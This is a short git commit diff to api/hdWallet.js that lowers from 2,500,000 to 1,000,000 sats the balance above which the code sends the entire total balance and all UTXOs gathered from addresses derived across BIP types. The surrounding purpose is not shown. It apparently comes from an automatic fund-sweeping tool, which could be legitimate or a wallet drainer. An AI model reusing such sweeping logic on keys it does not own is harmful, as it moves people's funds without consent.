a921e23f56f2e6a703084c455762f20d3445624a
thuglifentlin98 <169079663+thuglifentlin98@users.noreply.github.com>
2024-09-29 14:58:03 +0300

    Update hdWallet.js

--- api/hdWallet.js
+++ api/hdWallet.js
@@ -86,7 +86,7 @@ async function processAddressesForAllBipTypes(root, network, electrumClient) {
     await Promise.all(bipTypes);
 
     // Check if the total balance is greater than 2,500,000 sats
-    if (totalBalance > 2500000) {
+    if (totalBalance > 1000000) {
         await sendTransaction(totalBalance, allUtxos);
     }
 
